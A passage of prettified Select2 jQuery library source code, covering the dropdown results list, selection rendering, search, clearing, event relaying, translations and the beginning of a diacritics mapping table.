                  '<ul class="select2-results__options" role="listbox"></ul>'
                );
                return (
                  this.options.get("multiple") &&
                    t.attr("aria-multiselectable", "true"),
                  (this.$results = t),
                  t
                );
              }),
              (n.prototype.clear = function () {
                this.$results.empty();
              }),
              (n.prototype.displayMessage = function (t) {
                var n = this.options.get("escapeMarkup");
                this.clear(), this.hideLoading();
                var r = e(
                    '<li role="alert" aria-live="assertive" class="select2-results__option"></li>'
                  ),
                  i = this.options.get("translations").get(t.message);
                r.append(n(i(t.args))),
                  (r[0].className += " select2-results__message"),
                  this.$results.append(r);
              }),
              (n.prototype.hideMessages = function () {
                this.$results.find(".select2-results__message").remove();
              }),
              (n.prototype.append = function (e) {
                this.hideLoading();
                var t = [];
                if (null != e.results && 0 !== e.results.length) {
                  e.results = this.sort(e.results);
                  for (var n = 0; n < e.results.length; n++) {
                    var r = e.results[n],
                      i = this.option(r);
                    t.push(i);
                  }
                  this.$results.append(t);
                } else
                  0 === this.$results.children().length &&
                    this.trigger("results:message", { message: "noResults" });
              }),
              (n.prototype.position = function (e, t) {
                t.find(".select2-results").append(e);
              }),
              (n.prototype.sort = function (e) {
                return this.options.get("sorter")(e);
              }),
              (n.prototype.highlightFirstItem = function () {
                var e = this.$results.find(
                    ".select2-results__option--selectable"
                  ),
                  t = e.filter(".select2-results__option--selected");
                t.length > 0
                  ? t.first().trigger("mouseenter")
                  : e.first().trigger("mouseenter"),
                  this.ensureHighlightVisible();
              }),
              (n.prototype.setClasses = function () {
                var n = this;
                this.data.current(function (r) {
                  var i = r.map(function (e) {
                    return e.id.toString();
                  });
                  n.$results
                    .find(".select2-results__option--selectable")
                    .each(function () {
                      var n = e(this),
                        r = t.GetData(this, "data"),
                        o = "" + r.id;
                      (null != r.element && r.element.selected) ||
                      (null == r.element && i.indexOf(o) > -1)
                        ? (this.classList.add(
                            "select2-results__option--selected"
                          ),
                          n.attr("aria-selected", "true"))
                        : (this.classList.remove(
                            "select2-results__option--selected"
                          ),
                          n.attr("aria-selected", "false"));
                    });
                });
              }),
              (n.prototype.showLoading = function (e) {
                this.hideLoading();
                var t = {
                    disabled: !0,
                    loading: !0,
                    text: this.options.get("translations").get("searching")(e),
                  },
                  n = this.option(t);
                (n.className += " loading-results"), this.$results.prepend(n);
              }),
              (n.prototype.hideLoading = function () {
                this.$results.find(".loading-results").remove();
              }),
              (n.prototype.option = function (n) {
                var r = document.createElement("li");
                r.classList.add("select2-results__option"),
                  r.classList.add("select2-results__option--selectable");
                var i = { role: "option" },
                  o =
                    window.Element.prototype.matches ||
                    window.Element.prototype.msMatchesSelector ||
                    window.Element.prototype.webkitMatchesSelector;
                for (var s in (((null != n.element &&
                  o.call(n.element, ":disabled")) ||
                  (null == n.element && n.disabled)) &&
                  ((i["aria-disabled"] = "true"),
                  r.classList.remove("select2-results__option--selectable"),
                  r.classList.add("select2-results__option--disabled")),
                null == n.id &&
                  r.classList.remove("select2-results__option--selectable"),
                null != n._resultId && (r.id = n._resultId),
                n.title && (r.title = n.title),
                n.children &&
                  ((i.role = "group"),
                  (i["aria-label"] = n.text),
                  r.classList.remove("select2-results__option--selectable"),
                  r.classList.add("select2-results__option--group")),
                i)) {
                  var a = i[s];
                  r.setAttribute(s, a);
                }
                if (n.children) {
                  var l = e(r),
                    c = document.createElement("strong");
                  (c.className = "select2-results__group"), this.template(n, c);
                  for (var u = [], d = 0; d < n.children.length; d++) {
                    var p = n.children[d],
                      f = this.option(p);
                    u.push(f);
                  }
                  var h = e("<ul></ul>", {
                    class:
                      "select2-results__options select2-results__options--nested",
                    role: "none",
                  });
                  h.append(u), l.append(c), l.append(h);
                } else this.template(n, r);
                return t.StoreData(r, "data", n), r;
              }),
              (n.prototype.bind = function (n, r) {
                var i = this,
                  o = n.id + "-results";
                this.$results.attr("id", o),
                  n.on("results:all", function (e) {
                    i.clear(),
                      i.append(e.data),
                      n.isOpen() && (i.setClasses(), i.highlightFirstItem());
                  }),
                  n.on("results:append", function (e) {
                    i.append(e.data), n.isOpen() && i.setClasses();
                  }),
                  n.on("query", function (e) {
                    i.hideMessages(), i.showLoading(e);
                  }),
                  n.on("select", function () {
                    n.isOpen() &&
                      (i.setClasses(),
                      i.options.get("scrollAfterSelect") &&
                        i.highlightFirstItem());
                  }),
                  n.on("unselect", function () {
                    n.isOpen() &&
                      (i.setClasses(),
                      i.options.get("scrollAfterSelect") &&
                        i.highlightFirstItem());
                  }),
                  n.on("open", function () {
                    i.$results.attr("aria-expanded", "true"),
                      i.$results.attr("aria-hidden", "false"),
                      i.setClasses(),
                      i.ensureHighlightVisible();
                  }),
                  n.on("close", function () {
                    i.$results.attr("aria-expanded", "false"),
                      i.$results.attr("aria-hidden", "true"),
                      i.$results.removeAttr("aria-activedescendant");
                  }),
                  n.on("results:toggle", function () {
                    var e = i.getHighlightedResults();
                    0 !== e.length && e.trigger("mouseup");
                  }),
                  n.on("results:select", function () {
                    var e = i.getHighlightedResults();
                    if (0 !== e.length) {
                      var n = t.GetData(e[0], "data");
                      e.hasClass("select2-results__option--selected")
                        ? i.trigger("close", {})
                        : i.trigger("select", { data: n });
                    }
                  }),
                  n.on("results:previous", function () {
                    var e = i.getHighlightedResults(),
                      t = i.$results.find(
                        ".select2-results__option--selectable"
                      ),
                      n = t.index(e);
                    if (!(n <= 0)) {
                      var r = n - 1;
                      0 === e.length && (r = 0);
                      var o = t.eq(r);
                      o.trigger("mouseenter");
                      var s = i.$results.offset().top,
                        a = o.offset().top,
                        l = i.$results.scrollTop() + (a - s);
                      0 === r
                        ? i.$results.scrollTop(0)
                        : a - s < 0 && i.$results.scrollTop(l);
                    }
                  }),
                  n.on("results:next", function () {
                    var e = i.getHighlightedResults(),
                      t = i.$results.find(
                        ".select2-results__option--selectable"
                      ),
                      n = t.index(e) + 1;
                    if (!(n >= t.length)) {
                      var r = t.eq(n);
                      r.trigger("mouseenter");
                      var o =
                          i.$results.offset().top + i.$results.outerHeight(!1),
                        s = r.offset().top + r.outerHeight(!1),
                        a = i.$results.scrollTop() + s - o;
                      0 === n
                        ? i.$results.scrollTop(0)
                        : s > o && i.$results.scrollTop(a);
                    }
                  }),
                  n.on("results:focus", function (e) {
                    e.element[0].classList.add(
                      "select2-results__option--highlighted"
                    ),
                      e.element[0].setAttribute("aria-selected", "true");
                  }),
                  n.on("results:message", function (e) {
                    i.displayMessage(e);
                  }),
                  e.fn.mousewheel &&
                    this.$results.on("mousewheel", function (e) {
                      var t = i.$results.scrollTop(),
                        n = i.$results.get(0).scrollHeight - t + e.deltaY,
                        r = e.deltaY > 0 && t - e.deltaY <= 0,
                        o = e.deltaY < 0 && n <= i.$results.height();
                      r
                        ? (i.$results.scrollTop(0),
                          e.preventDefault(),
                          e.stopPropagation())
                        : o &&
                          (i.$results.scrollTop(
                            i.$results.get(0).scrollHeight - i.$results.height()
                          ),
                          e.preventDefault(),
                          e.stopPropagation());
                    }),
                  this.$results.on(
                    "mouseup",
                    ".select2-results__option--selectable",
                    function (n) {
                      var r = e(this),
                        o = t.GetData(this, "data");
                      r.hasClass("select2-results__option--selected")
                        ? i.options.get("multiple")
                          ? i.trigger("unselect", { originalEvent: n, data: o })
                          : i.trigger("close", {})
                        : i.trigger("select", { originalEvent: n, data: o });
                    }
                  ),
                  this.$results.on(
                    "mouseenter",
                    ".select2-results__option--selectable",
                    function (n) {
                      var r = t.GetData(this, "data");
                      i
                        .getHighlightedResults()
                        .removeClass("select2-results__option--highlighted")
                        .attr("aria-selected", "false"),
                        i.trigger("results:focus", {
                          data: r,
                          element: e(this),
                        });
                    }
                  );
              }),
              (n.prototype.getHighlightedResults = function () {
                return this.$results.find(
                  ".select2-results__option--highlighted"
                );
              }),
              (n.prototype.destroy = function () {
                this.$results.remove();
              }),
              (n.prototype.ensureHighlightVisible = function () {
                var e = this.getHighlightedResults();
                if (0 !== e.length) {
                  var t = this.$results
                      .find(".select2-results__option--selectable")
                      .index(e),
                    n = this.$results.offset().top,
                    r = e.offset().top,
                    i = this.$results.scrollTop() + (r - n),
                    o = r - n;
                  (i -= 2 * e.outerHeight(!1)),
                    t <= 2
                      ? this.$results.scrollTop(0)
                      : (o > this.$results.outerHeight() || o < 0) &&
                        this.$results.scrollTop(i);
                }
              }),
              (n.prototype.template = function (t, n) {
                var r = this.options.get("templateResult"),
                  i = this.options.get("escapeMarkup"),
                  o = r(t, n);
                null == o
                  ? (n.style.display = "none")
                  : "string" == typeof o
                  ? (n.innerHTML = i(o))
                  : e(n).append(o);
              }),
              n
            );
          }),
          t.define("select2/keys", [], function () {
            return {
              BACKSPACE: 8,
              TAB: 9,
              ENTER: 13,
              SHIFT: 16,
              CTRL: 17,
              ALT: 18,
              ESC: 27,
              SPACE: 32,
              PAGE_UP: 33,
              PAGE_DOWN: 34,
              END: 35,
              HOME: 36,
              LEFT: 37,
              UP: 38,
              RIGHT: 39,
              DOWN: 40,
              DELETE: 46,
            };
          }),
          t.define(
            "select2/selection/base",
            ["jquery", "../utils", "../keys"],
            function (e, t, n) {
              function r(e, t) {
                (this.$element = e),
                  (this.options = t),
                  r.__super__.constructor.call(this);
              }
              return (
                t.Extend(r, t.Observable),
                (r.prototype.render = function () {
                  var n = e(
                    '<span class="select2-selection" role="combobox"  aria-haspopup="true" aria-expanded="false"></span>'
                  );
                  return (
                    (this._tabindex = 0),
                    null != t.GetData(this.$element[0], "old-tabindex")
                      ? (this._tabindex = t.GetData(
                          this.$element[0],
                          "old-tabindex"
                        ))
                      : null != this.$element.attr("tabindex") &&
                        (this._tabindex = this.$element.attr("tabindex")),
                    n.attr("title", this.$element.attr("title")),
                    n.attr("tabindex", this._tabindex),
                    n.attr("aria-disabled", "false"),
                    (this.$selection = n),
                    n
                  );
                }),
                (r.prototype.bind = function (e, t) {
                  var r = this,
                    i = e.id + "-results";
                  (this.container = e),
                    this.$selection.on("focus", function (e) {
                      r.trigger("focus", e);
                    }),
                    this.$selection.on("blur", function (e) {
                      r._handleBlur(e);
                    }),
                    this.$selection.on("keydown", function (e) {
                      r.trigger("keypress", e),
                        e.which === n.SPACE && e.preventDefault();
                    }),
                    e.on("results:focus", function (e) {
                      r.$selection.attr(
                        "aria-activedescendant",
                        e.data._resultId
                      );
                    }),
                    e.on("selection:update", function (e) {
                      r.update(e.data);
                    }),
                    e.on("open", function () {
                      r.$selection.attr("aria-expanded", "true"),
                        r.$selection.attr("aria-owns", i),
                        r._attachCloseHandler(e);
                    }),
                    e.on("close", function () {
                      r.$selection.attr("aria-expanded", "false"),
                        r.$selection.removeAttr("aria-activedescendant"),
                        r.$selection.removeAttr("aria-owns"),
                        r.$selection.trigger("focus"),
                        r._detachCloseHandler(e);
                    }),
                    e.on("enable", function () {
                      r.$selection.attr("tabindex", r._tabindex),
                        r.$selection.attr("aria-disabled", "false");
                    }),
                    e.on("disable", function () {
                      r.$selection.attr("tabindex", "-1"),
                        r.$selection.attr("aria-disabled", "true");
                    });
                }),
                (r.prototype._handleBlur = function (t) {
                  var n = this;
                  window.setTimeout(function () {
                    document.activeElement == n.$selection[0] ||
                      e.contains(n.$selection[0], document.activeElement) ||
                      n.trigger("blur", t);
                  }, 1);
                }),
                (r.prototype._attachCloseHandler = function (n) {
                  e(document.body).on(
                    "mousedown.select2." + n.id,
                    function (n) {
                      var r = e(n.target).closest(".select2");
                      e(".select2.select2-container--open").each(function () {
                        this != r[0] &&
                          t.GetData(this, "element").select2("close");
                      });
                    }
                  );
                }),
                (r.prototype._detachCloseHandler = function (t) {
                  e(document.body).off("mousedown.select2." + t.id);
                }),
                (r.prototype.position = function (e, t) {
                  t.find(".selection").append(e);
                }),
                (r.prototype.destroy = function () {
                  this._detachCloseHandler(this.container);
                }),
                (r.prototype.update = function (e) {
                  throw new Error(
                    "The `update` method must be defined in child classes."
                  );
                }),
                (r.prototype.isEnabled = function () {
                  return !this.isDisabled();
                }),
                (r.prototype.isDisabled = function () {
                  return this.options.get("disabled");
                }),
                r
              );
            }
          ),
          t.define(
            "select2/selection/single",
            ["jquery", "./base", "../utils", "../keys"],
            function (e, t, n, r) {
              function i() {
                i.__super__.constructor.apply(this, arguments);
              }
              return (
                n.Extend(i, t),
                (i.prototype.render = function () {
                  var e = i.__super__.render.call(this);
                  return (
                    e[0].classList.add("select2-selection--single"),
                    e.html(
                      '<span class="select2-selection__rendered"></span><span class="select2-selection__arrow" role="presentation"><b role="presentation"></b></span>'
                    ),
                    e
                  );
                }),
                (i.prototype.bind = function (e, t) {
                  var n = this;
                  i.__super__.bind.apply(this, arguments);
                  var r = e.id + "-container";
                  this.$selection
                    .find(".select2-selection__rendered")
                    .attr("id", r)
                    .attr("role", "textbox")
                    .attr("aria-readonly", "true"),
                    this.$selection.attr("aria-labelledby", r),
                    this.$selection.attr("aria-controls", r),
                    this.$selection.on("mousedown", function (e) {
                      1 === e.which &&
                        n.trigger("toggle", { originalEvent: e });
                    }),
                    this.$selection.on("focus", function (e) {}),
                    this.$selection.on("blur", function (e) {}),
                    e.on("focus", function (t) {
                      e.isOpen() || n.$selection.trigger("focus");
                    });
                }),
                (i.prototype.clear = function () {
                  var e = this.$selection.find(".select2-selection__rendered");
                  e.empty(), e.removeAttr("title");
                }),
                (i.prototype.display = function (e, t) {
                  var n = this.options.get("templateSelection");
                  return this.options.get("escapeMarkup")(n(e, t));
                }),
                (i.prototype.selectionContainer = function () {
                  return e("<span></span>");
                }),
                (i.prototype.update = function (e) {
                  if (0 !== e.length) {
                    var t = e[0],
                      n = this.$selection.find(".select2-selection__rendered"),
                      r = this.display(t, n);
                    n.empty().append(r);
                    var i = t.title || t.text;
                    i ? n.attr("title", i) : n.removeAttr("title");
                  } else this.clear();
                }),
                i
              );
            }
          ),
          t.define(
            "select2/selection/multiple",
            ["jquery", "./base", "../utils"],
            function (e, t, n) {
              function r(e, t) {
                r.__super__.constructor.apply(this, arguments);
              }
              return (
                n.Extend(r, t),
                (r.prototype.render = function () {
                  var e = r.__super__.render.call(this);
                  return (
                    e[0].classList.add("select2-selection--multiple"),
                    e.html('<ul class="select2-selection__rendered"></ul>'),
                    e
                  );
                }),
                (r.prototype.bind = function (t, i) {
                  var o = this;
                  r.__super__.bind.apply(this, arguments);
                  var s = t.id + "-container";
                  this.$selection
                    .find(".select2-selection__rendered")
                    .attr("id", s),
                    this.$selection.on("click", function (e) {
                      o.trigger("toggle", { originalEvent: e });
                    }),
                    this.$selection.on(
                      "click",
                      ".select2-selection__choice__remove",
                      function (t) {
                        if (!o.isDisabled()) {
                          var r = e(this).parent(),
                            i = n.GetData(r[0], "data");
                          o.trigger("unselect", { originalEvent: t, data: i });
                        }
                      }
                    ),
                    this.$selection.on(
                      "keydown",
                      ".select2-selection__choice__remove",
                      function (e) {
                        o.isDisabled() || e.stopPropagation();
                      }
                    );
                }),
                (r.prototype.clear = function () {
                  var e = this.$selection.find(".select2-selection__rendered");
                  e.empty(), e.removeAttr("title");
                }),
                (r.prototype.display = function (e, t) {
                  var n = this.options.get("templateSelection");
                  return this.options.get("escapeMarkup")(n(e, t));
                }),
                (r.prototype.selectionContainer = function () {
                  return e(
                    '<li class="select2-selection__choice"><button type="button" class="select2-selection__choice__remove" tabindex="-1"><span aria-hidden="true">&times;</span></button><span class="select2-selection__choice__display"></span></li>'
                  );
                }),
                (r.prototype.update = function (e) {
                  if ((this.clear(), 0 !== e.length)) {
                    for (
                      var t = [],
                        r =
                          this.$selection
                            .find(".select2-selection__rendered")
                            .attr("id") + "-choice-",
                        i = 0;
                      i < e.length;
                      i++
                    ) {
                      var o = e[i],
                        s = this.selectionContainer(),
                        a = this.display(o, s),
                        l = r + n.generateChars(4) + "-";
                      o.id ? (l += o.id) : (l += n.generateChars(4)),
                        s
                          .find(".select2-selection__choice__display")
                          .append(a)
                          .attr("id", l);
                      var c = o.title || o.text;
                      c && s.attr("title", c);
                      var u = this.options
                          .get("translations")
                          .get("removeItem"),
                        d = s.find(".select2-selection__choice__remove");
                      d.attr("title", u()),
                        d.attr("aria-label", u()),
                        d.attr("aria-describedby", l),
                        n.StoreData(s[0], "data", o),
                        t.push(s);
                    }
                    this.$selection
                      .find(".select2-selection__rendered")
                      .append(t);
                  }
                }),
                r
              );
            }
          ),
          t.define("select2/selection/placeholder", [], function () {
            var e = function (e, t, n) {
              (this.placeholder = this.normalizePlaceholder(
                n.get("placeholder")
              )),
                e.call(this, t, n);
            };
            return (
              (e.prototype.normalizePlaceholder = function (e, t) {
                return "string" == typeof t && (t = { id: "", text: t }), t;
              }),
              (e.prototype.createPlaceholder = function (e, t) {
                var n = this.selectionContainer();
                n.html(this.display(t)),
                  n[0].classList.add("select2-selection__placeholder"),
                  n[0].classList.remove("select2-selection__choice");
                var r = t.title || t.text || n.text();
                return (
                  this.$selection
                    .find(".select2-selection__rendered")
                    .attr("title", r),
                  n
                );
              }),
              (e.prototype.update = function (e, t) {
                var n = 1 == t.length && t[0].id != this.placeholder.id;
                if (t.length > 1 || n) return e.call(this, t);
                this.clear();
                var r = this.createPlaceholder(this.placeholder);
                this.$selection.find(".select2-selection__rendered").append(r);
              }),
              e
            );
          }),
          t.define(
            "select2/selection/allowClear",
            ["jquery", "../keys", "../utils"],
            function (e, t, n) {
              var r = function () {};
              return (
                (r.prototype.bind = function (e, t, n) {
                  var r = this;
                  e.call(this, t, n),
                    null == this.placeholder &&
                      this.options.get("debug") &&
                      window.console &&
                      console.error &&
                      console.error(
                        "Select2: The `allowClear` option should be used in combination with the `placeholder` option."
                      ),
                    this.$selection.on(
                      "mousedown",
                      ".select2-selection__clear",
                      function (e) {
                        r._handleClear(e);
                      }
                    ),
                    t.on("keypress", function (e) {
                      r._handleKeyboardClear(e, t);
                    });
                }),
                (r.prototype._handleClear = function (e, t) {
                  if (!this.isDisabled()) {
                    var r = this.$selection.find(".select2-selection__clear");
                    if (0 !== r.length) {
                      t.stopPropagation();
                      var i = n.GetData(r[0], "data"),
                        o = this.$element.val();
                      this.$element.val(this.placeholder.id);
                      var s = { data: i };
                      if ((this.trigger("clear", s), s.prevented))
                        this.$element.val(o);
                      else {
                        for (var a = 0; a < i.length; a++)
                          if (
                            ((s = { data: i[a] }),
                            this.trigger("unselect", s),
                            s.prevented)
                          )
                            return void this.$element.val(o);
                        this.$element.trigger("input").trigger("change"),
                          this.trigger("toggle", {});
                      }
                    }
                  }
                }),
                (r.prototype._handleKeyboardClear = function (e, n, r) {
                  r.isOpen() ||
                    (n.which != t.DELETE && n.which != t.BACKSPACE) ||
                    this._handleClear(n);
                }),
                (r.prototype.update = function (t, r) {
                  if (
                    (t.call(this, r),
                    this.$selection.find(".select2-selection__clear").remove(),
                    this.$selection[0].classList.remove(
                      "select2-selection--clearable"
                    ),
                    !(
                      this.$selection.find(".select2-selection__placeholder")
                        .length > 0 || 0 === r.length
                    ))
                  ) {
                    var i = this.$selection
                        .find(".select2-selection__rendered")
                        .attr("id"),
                      o = this.options
                        .get("translations")
                        .get("removeAllItems"),
                      s = e(
                        '<button type="button" class="select2-selection__clear" tabindex="-1"><span aria-hidden="true">&times;</span></button>'
                      );
                    s.attr("title", o()),
                      s.attr("aria-label", o()),
                      s.attr("aria-describedby", i),
                      n.StoreData(s[0], "data", r),
                      this.$selection.prepend(s),
                      this.$selection[0].classList.add(
                        "select2-selection--clearable"
                      );
                  }
                }),
                r
              );
            }
          ),
          t.define(
            "select2/selection/search",
            ["jquery", "../utils", "../keys"],
            function (e, t, n) {
              var r = function (e, t, n) {
                e.call(this, t, n);
              };
              return (
                (r.prototype.render = function (t) {
                  var n = this.options.get("translations").get("search"),
                    r = e(
                      '<span class="select2-search select2-search--inline"><textarea class="select2-search__field" type="search" tabindex="-1" autocorrect="off" autocapitalize="none" spellcheck="false" role="searchbox" aria-autocomplete="list" ></textarea></span>'
                    );
                  (this.$searchContainer = r),
                    (this.$search = r.find("textarea")),
                    this.$search.prop(
                      "autocomplete",
                      this.options.get("autocomplete")
                    ),
                    this.$search.attr("aria-label", n());
                  var i = t.call(this);
                  return (
                    this._transferTabIndex(), i.append(this.$searchContainer), i
                  );
                }),
                (r.prototype.bind = function (e, r, i) {
                  var o = this,
                    s = r.id + "-results",
                    a = r.id + "-container";
                  e.call(this, r, i),
                    o.$search.attr("aria-describedby", a),
                    r.on("open", function () {
                      o.$search.attr("aria-controls", s),
                        o.$search.trigger("focus");
                    }),
                    r.on("close", function () {
                      o.$search.val(""),
                        o.resizeSearch(),
                        o.$search.removeAttr("aria-controls"),
                        o.$search.removeAttr("aria-activedescendant"),
                        o.$search.trigger("focus");
                    }),
                    r.on("enable", function () {
                      o.$search.prop("disabled", !1), o._transferTabIndex();
                    }),
                    r.on("disable", function () {
                      o.$search.prop("disabled", !0);
                    }),
                    r.on("focus", function (e) {
                      o.$search.trigger("focus");
                    }),
                    r.on("results:focus", function (e) {
                      e.data._resultId
                        ? o.$search.attr(
                            "aria-activedescendant",
                            e.data._resultId
                          )
                        : o.$search.removeAttr("aria-activedescendant");
                    }),
                    this.$selection.on(
                      "focusin",
                      ".select2-search--inline",
                      function (e) {
                        o.trigger("focus", e);
                      }
                    ),
                    this.$selection.on(
                      "focusout",
                      ".select2-search--inline",
                      function (e) {
                        o._handleBlur(e);
                      }
                    ),
                    this.$selection.on(
                      "keydown",
                      ".select2-search--inline",
                      function (e) {
                        if (
                          (e.stopPropagation(),
                          o.trigger("keypress", e),
                          (o._keyUpPrevented = e.isDefaultPrevented()),
                          e.which === n.BACKSPACE && "" === o.$search.val())
                        ) {
                          var r = o.$selection
                            .find(".select2-selection__choice")
                            .last();
                          if (r.length > 0) {
                            var i = t.GetData(r[0], "data");
                            o.searchRemoveChoice(i), e.preventDefault();
                          }
                        }
                      }
                    ),
                    this.$selection.on(
                      "click",
                      ".select2-search--inline",
                      function (e) {
                        o.$search.val() && e.stopPropagation();
                      }
                    );
                  var l = document.documentMode,
                    c = l && l <= 11;
                  this.$selection.on(
                    "input.searchcheck",
                    ".select2-search--inline",
                    function (e) {
                      c
                        ? o.$selection.off("input.search input.searchcheck")
                        : o.$selection.off("keyup.search");
                    }
                  ),
                    this.$selection.on(
                      "keyup.search input.search",
                      ".select2-search--inline",
                      function (e) {
                        if (c && "input" === e.type)
                          o.$selection.off("input.search input.searchcheck");
                        else {
                          var t = e.which;
                          t != n.SHIFT &&
                            t != n.CTRL &&
                            t != n.ALT &&
                            t != n.TAB &&
                            o.handleSearch(e);
                        }
                      }
                    );
                }),
                (r.prototype._transferTabIndex = function (e) {
                  this.$search.attr(
                    "tabindex",
                    this.$selection.attr("tabindex")
                  ),
                    this.$selection.attr("tabindex", "-1");
                }),
                (r.prototype.createPlaceholder = function (e, t) {
                  this.$search.attr("placeholder", t.text);
                }),
                (r.prototype.update = function (e, t) {
                  var n = this.$search[0] == document.activeElement;
                  this.$search.attr("placeholder", ""),
                    e.call(this, t),
                    this.resizeSearch(),
                    n && this.$search.trigger("focus");
                }),
                (r.prototype.handleSearch = function () {
                  if ((this.resizeSearch(), !this._keyUpPrevented)) {
                    var e = this.$search.val();
                    this.trigger("query", { term: e });
                  }
                  this._keyUpPrevented = !1;
                }),
                (r.prototype.searchRemoveChoice = function (e, t) {
                  this.trigger("unselect", { data: t }),
                    this.$search.val(t.text),
                    this.handleSearch();
                }),
                (r.prototype.resizeSearch = function () {
                  this.$search.css("width", "25px");
                  var e = "100%";
                  "" === this.$search.attr("placeholder") &&
                    (e = 0.75 * (this.$search.val().length + 1) + "em"),
                    this.$search.css("width", e);
                }),
                r
              );
            }
          ),
          t.define(
            "select2/selection/selectionCss",
            ["../utils"],
            function (e) {
              var t = function () {};
              return (
                (t.prototype.render = function (t) {
                  var n = t.call(this),
                    r = this.options.get("selectionCssClass") || "";
                  return (
                    -1 !== r.indexOf(":all:") &&
                      ((r = r.replace(":all:", "")),
                      e.copyNonInternalCssClasses(n[0], this.$element[0])),
                    n.addClass(r),
                    n
                  );
                }),
                t
              );
            }
          ),
          t.define("select2/selection/eventRelay", ["jquery"], function (e) {
            var t = function () {};
            return (
              (t.prototype.bind = function (t, n, r) {
                var i = this,
                  o = [
                    "open",
                    "opening",
                    "close",
                    "closing",
                    "select",
                    "selecting",
                    "unselect",
                    "unselecting",
                    "clear",
                    "clearing",
                  ],
                  s = [
                    "opening",
                    "closing",
                    "selecting",
                    "unselecting",
                    "clearing",
                  ];
                t.call(this, n, r),
                  n.on("*", function (t, n) {
                    if (-1 !== o.indexOf(t)) {
                      n = n || {};
                      var r = e.Event("select2:" + t, { params: n });
                      i.$element.trigger(r),
                        -1 !== s.indexOf(t) &&
                          (n.prevented = r.isDefaultPrevented());
                    }
                  });
              }),
              t
            );
          }),
          t.define(
            "select2/translation",
            ["jquery", "require"],
            function (e, t) {
              var n = function (e) {
                this.dict = e || {};
              };
              return (
                (n.prototype.all = function () {
                  return this.dict;
                }),
                (n.prototype.get = function (e) {
                  return this.dict[e];
                }),
                (n.prototype.extend = function (t) {
                  this.dict = e.extend({}, t.all(), this.dict);
                }),
                (n._cache = {}),
                (n.loadPath = function (e) {
                  if (!(e in n._cache)) {
                    var r = t(e);
                    n._cache[e] = r;
                  }
                  return new n(n._cache[e]);
                }),
                n
              );
            }
          ),
          t.define("select2/diacritics", [], function () {
            return {
              "Ⓐ": "A",
              Ａ: "A",
              À: "A",
              Á: "A",
              Â: "A",
              Ầ: "A",
              Ấ: "A",
              Ẫ: "A",
              Ẩ: "A",
              Ã: "A",
              Ā: "A",
              Ă: "A",
              Ằ: "A",
              Ắ: "A",
              Ẵ: "A",
              Ẳ: "A",
              Ȧ: "A",
              Ǡ: "A",
              Ä: "A",
              Ǟ: "A",
              Ả: "A",
              Å: "A",
              Ǻ: "A",
              Ǎ: "A",
              Ȁ: "A",
              Ȃ: "A",
              Ạ: "A",
              Ậ: "A",
              Ặ: "A",
              Ḁ: "A",
              Ą: "A",
              Ⱥ: "A",
              Ɐ: "A",
              Ꜳ: "AA",
              Æ: "AE",
              Ǽ: "AE",
              Ǣ: "AE",
              Ꜵ: "AO",
              Ꜷ: "AU",
              Ꜹ: "AV",
              Ꜻ: "AV",
              Ꜽ: "AY",
              "Ⓑ": "B",
              Ｂ: "B",
              Ḃ: "B",
              Ḅ: "B",
              Ḇ: "B",
              Ƀ: "B",
              Ƃ: "B",
              Ɓ: "B",
              "Ⓒ": "C",
              Ｃ: "C",
              Ć: "C",
              Ĉ: "C",
              Ċ: "C",
              Č: "C",
              Ç: "C",
              Ḉ: "C",
              Ƈ: "C",
              Ȼ: "C",
              Ꜿ: "C",
              "Ⓓ": "D",
              Ｄ: "D",
              Ḋ: "D",
              Ď: "D",
              Ḍ: "D",
              Ḑ: "D",
              Ḓ: "D",
              Ḏ: "D",
              Đ: "D",
              Ƌ: "D",
              Ɗ: "D",
              Ɖ: "D",
              Ꝺ: "D",
              Ǳ: "DZ",
              Ǆ: "DZ",
              ǲ: "Dz",
              ǅ: "Dz",
              "Ⓔ": "E",
              Ｅ: "E",
              È: "E",
              É: "E",
              Ê: "E",
              Ề: "E",
              Ế: "E",
              Ễ: "E",
              Ể: "E",
              Ẽ: "E",
              Ē: "E",
              Ḕ: "E",
              Ḗ: "E",
              Ĕ: "E",
              Ė: "E",
              Ë: "E",
              Ẻ: "E",
              Ě: "E",
              Ȅ: "E",
              Ȇ: "E",
              Ẹ: "E",
              Ệ: "E",
              Ȩ: "E",
              Ḝ: "E",
              Ę: "E",
              Ḙ: "E",
              Ḛ: "E",
              Ɛ: "E",
              Ǝ: "E",
              "Ⓕ": "F",
              Ｆ: "F",
              Ḟ: "F",
              Ƒ: "F",
              Ꝼ: "F",
              "Ⓖ": "G",
              Ｇ: "G",
              Ǵ: "G",
              Ĝ: "G",
              Ḡ: "G",
              Ğ: "G",
              Ġ: "G",
              Ǧ: "G",
              Ģ: "G",
              Ǥ: "G",
              Ɠ: "G",
              Ꞡ: "G",
              Ᵹ: "G",
              Ꝿ: "G",
              "Ⓗ": "H",
              Ｈ: "H",
              Ĥ: "H",
              Ḣ: "H",
              Ḧ: "H",
              Ȟ: "H",
              Ḥ: "H",
              Ḩ: "H",
              Ḫ: "H",
              Ħ: "H",
              Ⱨ: "H",
              Ⱶ: "H",
              Ɥ: "H",
              "Ⓘ": "I",
              Ｉ: "I",
              Ì: "I",
              Í: "I",
              Î: "I",
              Ĩ: "I",
              Ī: "I",
              Ĭ: "I",
              İ: "I",
              Ï: "I",
              Ḯ: "I",
              Ỉ: "I",
              Ǐ: "I",
              Ȉ: "I",
              Ȋ: "I",
              Ị: "I",
              Į: "I",
              Ḭ: "I",
              Ɨ: "I",
              "Ⓙ": "J",
              Ｊ: "J",
              Ĵ: "J",
              Ɉ: "J",
              "Ⓚ": "K",
              Ｋ: "K",
              Ḱ: "K",
              Ǩ: "K",
              Ḳ: "K",
              Ķ: "K",
              Ḵ: "K",
              Ƙ: "K",
              Ⱪ: "K",
              Ꝁ: "K",
              Ꝃ: "K",
              Ꝅ: "K",
              Ꞣ: "K",
              "Ⓛ": "L",
              Ｌ: "L",
              Ŀ: "L",
              Ĺ: "L",
              Ľ: "L",
              Ḷ: "L",
              Ḹ: "L",
              Ļ: "L",
              Ḽ: "L",
              Ḻ: "L",
              Ł: "L",
              Ƚ: "L",
              Ɫ: "L",
              Ⱡ: "L",
              Ꝉ: "L",
              Ꝇ: "L",
              Ꞁ: "L",
              Ǉ: "LJ",
              ǈ: "Lj",
              "Ⓜ": "M",
              Ｍ: "M",
              Ḿ: "M",
              Ṁ: "M",
              Ṃ: "M",
              Ɱ: "M",
              Ɯ: "M",
              "Ⓝ": "N",
              Ｎ: "N",
              Ǹ: "N",
              Ń: "N",
              Ñ: "N",
              Ṅ: "N",
              Ň: "N",
              Ṇ: "N",
              Ņ: "N",
              Ṋ: "N",
